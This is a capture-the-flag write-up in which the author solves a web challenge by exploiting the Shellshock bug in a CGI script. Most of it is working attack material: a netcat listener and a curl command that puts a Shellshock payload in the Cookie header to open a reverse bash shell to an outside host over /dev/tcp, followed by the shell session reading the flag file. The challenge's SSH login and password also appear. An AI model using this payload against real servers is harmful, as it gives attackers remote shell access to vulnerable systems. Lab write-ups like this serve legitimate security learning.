# Country(200):  Oman
----------
Description:  Find flag.txt and get the flag!

http://52.9.13.75:8888/index.cgi

*** NOTE:
Please SSH into the following box and do your exploits from there. Otherwise you'll get blocked by CK security systems.

ssh ckctf@54.241.154.223
password is: P@ssw0rd!}
----------
Hint:  Getting a SHELL can be SHOCKING!
----------
Attachments:  []
~!|----------|!~

This one seems to be vulnerable to the "shell shock" vulnerabilitiy

```
~ # curl -vv http://52.9.13.75:8888/index.cgi                                                                                                                                                                               root@5888aef1c272
*   Trying 52.9.13.75...
* TCP_NODELAY set
* Connected to 52.9.13.75 (52.9.13.75) port 8888 (#0)
> GET /index.cgi HTTP/1.1
> Host: 52.9.13.75:8888
> User-Agent: curl/7.61.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Mon, 22 Oct 2018 20:14:48 GMT
< Server: Apache/2.4.10 (Debian)
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/html
<
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Hello World</title>
</head>
<body>
<p>
Hello World!
</p>
</body>
</html>
* Connection #0 to host 52.9.13.75 left intact
```

the exploit was much easier than i anticipated,

i basically created a "hackbox" on do, inside of which i started netcat in listening mode

```
root@hackbox:/opt/metasploit-framework# nc -vlp 4444
```

then i proceded to inject a reverse shell payload through the cookie header
```
curl -vv -H "Cookie:() { :; }; /bin/bash -c /bin/bash -i > & /dev/tcp/142.93.194.254/4444 0>&1 &" http://52.9.13.75:8888/index.cgi
```

this allowed the bash session to show up on the DO box:
```
root@hackbox:/opt/metasploit-framework# nc -vlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [52.9.13.75] port 4444 [tcp/*] accepted (family 2, sport 39332)

ls
index.cgi
index.html
cat /etc/flag.txt
CK{76c81527ed52d989aab719271c63569895e2fb20}
^C
```

and that was it, easy peasy, i still lost to alex tho :(